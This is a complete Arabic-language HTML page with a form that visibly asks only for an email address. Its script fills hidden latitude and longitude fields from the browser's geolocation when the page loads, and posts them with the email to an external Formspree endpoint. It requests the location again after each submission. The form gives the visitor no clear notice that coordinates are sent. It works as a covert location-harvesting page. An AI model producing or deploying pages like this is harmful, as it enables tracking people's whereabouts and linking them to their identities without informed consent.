<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>إرسال بيانات البريد والموقع</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #2c3e50, #3498db);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      flex-direction: column;
    }
    form {
      background: rgba(0,0,0,0.4);
      padding: 25px;
      border-radius: 10px;
      width: 320px;
      text-align: center;
    }
    input[type="email"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border-radius: 6px;
      border: none;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #1abc9c;
      border: none;
      border-radius: 6px;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }
    button:disabled {
      background-color: #7f8c8d;
      cursor: not-allowed;
    }
    .message {
      margin-top: 15px;
      font-size: 14px;
      min-height: 20px;
    }
  </style>
</head>
<body>

  <form id="dataForm" action="https://formspree.io/f/xzzvzzkk" method="POST">
    <h2>أدخل بريدك الإلكتروني</h2>
    <input type="email" name="email" id="email" placeholder="example@email.com" required />
    <!-- حقول الموقع الجغرافي مخفية -->
    <input type="hidden" name="latitude" id="latitude" />
    <input type="hidden" name="longitude" id="longitude" />
    <button type="submit">إرسال البيانات</button>
    <div class="message" id="message"></div>
  </form>

  <script>
    const form = document.getElementById('dataForm');
    const messageDiv = document.getElementById('message');

    // طلب الموقع الجغرافي عند تحميل الصفحة
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        position => {
          document.getElementById('latitude').value = position.coords.latitude.toFixed(6);
          document.getElementById('longitude').value = position.coords.longitude.toFixed(6);
        },
        error => {
          // لو رفض المستخدم المشاركة أو حدث خطأ، نترك الحقول فارغة
          console.warn('لم يتم الحصول على الموقع:', error.message);
        }
      );
    } else {
      console.warn('المتصفح لا يدعم الموقع الجغرافي');
    }

    // التعامل مع إرسال الفورم
    form.addEventListener('submit', e => {
      e.preventDefault();
      messageDiv.textContent = 'جارٍ إرسال البيانات...';

      const formData = new FormData(form);

      fetch(form.action, {
        method: 'POST',
        body: formData,
        headers: { 'Accept': 'application/json' }
      })
      .then(response => {
        if (response.ok) {
          messageDiv.style.color = '#2ecc71';
          messageDiv.textContent = 'تم إرسال البيانات بنجاح!';
          form.reset();
          // إعادة طلب الموقع بعد الإرسال تحضيراً لإرسال جديد
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              pos => {
                document.getElementById('latitude').value = pos.coords.latitude.toFixed(6);
                document.getElementById('longitude').value = pos.coords.longitude.toFixed(6);
              }
            );
          }
        } else {
          throw new Error('فشل في إرسال البيانات');
        }
      })
      .catch(() => {
        messageDiv.style.color = '#e74c3c';
        messageDiv.textContent = 'حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.';
      });
    });
  </script>

</body>
</html>
